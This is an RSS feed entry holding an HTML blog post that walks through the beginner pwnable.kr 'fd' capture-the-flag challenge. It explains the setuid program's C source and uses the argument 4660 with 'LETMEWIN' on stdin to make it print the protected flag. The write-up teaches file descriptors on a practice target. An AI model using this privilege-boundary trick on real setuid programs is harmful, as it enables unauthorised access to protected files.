&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fd@pwnable:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;fd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Okay, based on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami&lt;/code&gt; command, we are not able to simply read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt;, as we are not part of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; group, nor are we &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd_pwn&lt;/code&gt; user. However, we can read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd.c&lt;/code&gt; and execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd&lt;/code&gt;. We can &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat fd.c&lt;/code&gt; to see its contents:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pass argv[1] a number&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;atoi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1234&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;LETMEWIN&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;good job :)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/cat flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;learn about Linux file IO&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This program seems to be taking a single-number argument in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; and evaluating the expression &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;atoi(argv[1]) - 0x1234&lt;/code&gt;, storing the result into the variable called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read&lt;/code&gt; C function takes a file descriptor as first argument, which means it will read what is passed in that specific descriptor. This is stored in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buf&lt;/code&gt; buffer variable.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcmp&lt;/code&gt; function will compare the string stored in the buffer with “LETMEWIN\n”, and if they are equal, &lt;em&gt;i.e.&lt;/em&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcmp&lt;/code&gt; returns 0, the if statement becomes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!0&lt;/code&gt; (C equivalent to true).&lt;/p&gt;

&lt;p&gt;The key to solve this problem is to pass an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; that will evaluate &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd&lt;/code&gt; to a file descriptor we can control containing the string “LETMEWIN”.&lt;/p&gt;

&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;

&lt;p&gt;Now that we understand the basic concepts and the CTF problem, we need to think of a plausible attack vector. The easiest one in this case is to control the stdin descriptor, which is one that is hard to defend against. Looking at our table, this file descriptor is represented by the integer 0. So we need to pass an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; that will evaluate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd&lt;/code&gt; variable to 0. Note that:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd = atoi(argv[1]) - 0x1234&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;which is telling us that the number we pass will be subtracted by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1234&lt;/code&gt;, a hexadecimal value. We can use &lt;a href=&quot;https://www.rapidtables.com/convert/number/hex-to-decimal.html&quot;&gt;this&lt;/a&gt; website to convert hex to decimal. Note that the hexadecimal number 0x1234 is 4660 in decimal. So, if we need &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd&lt;/code&gt; to be 0, we need to pass 4660 as the argument. If we did everything correctly, this argument will prompt us the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read&lt;/code&gt; function to input a stdin value, rather than just telling us to learn about Linux file IO, as we get if we pass a random number:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fd@pwnable:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./fd 123
learn about Linux file IO
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, passing 4660, the code starts expecting another input!&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fd@pwnable:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./fd 4660
asdasd
learn about Linux file IO
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Promising!&lt;/p&gt;

&lt;h2 id=&quot;-step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt; Step 4 - Solving!&lt;/h2&gt;

&lt;p&gt;I think the solution becomes self explanatory at this point. If not, it may be a good idea to re-read this post!&lt;/p&gt;

&lt;p&gt;When the code expects the second input, which is the stdin descriptor, we need to pass the string “LETMEWIN” so that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcmp&lt;/code&gt; evaluates to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!0&lt;/code&gt;, triggering the if statement that reads the flag:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fd@pwnable:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./fd 4660
LETMEWIN
good job :&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
mommy! I think I know what a file descriptor is!!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Amazing! Enjoy your Poring card drop. It was well deserved!&lt;/p&gt;

&lt;h3 id=&quot;-another-solution&quot;&gt;&lt;a href=&quot;#solution2&quot;&gt;&lt;/a&gt; Another solution&lt;/h3&gt;

&lt;p&gt;Another way to solve this is piping the “LETMEWIN” string directly to the program. This is similar to the example we gave about stdin descriptor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo &quot;ls&quot; | bash&lt;/code&gt;, which executes the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command.&lt;/p&gt;

&lt;p&gt;Here, we basically do the same thing, but passing “LETMEWIN” to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./fd 4660&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fd@pwnable:~$ echo &quot;LETMEWIN&quot; | ./fd 4660
good job :)
mommy! I think I know what a file descriptor is!!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;-conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt; Conclusion&lt;/h1&gt;

&lt;p&gt;Solving CTFs and anything in life, for that matter, comes down to doing a good research beforehand.&lt;/p&gt;

&lt;p&gt;In this CTF, we’ve learned what file descriptors are, as well as understood some C code analysis on the way.&lt;/p&gt;

&lt;p&gt;Thanks for sticking ‘til the end. I hope you enjoyed it! And remember, always do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Fri, 01 Dec 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000//fd-pwnable</link>
        <link href="http://localhost:4000/fd-pwnable"/>
        <guid isPermaLink="true">http://localhost:4000/fd-pwnable</guid>
      </item>
    
  </channel>
</rss>
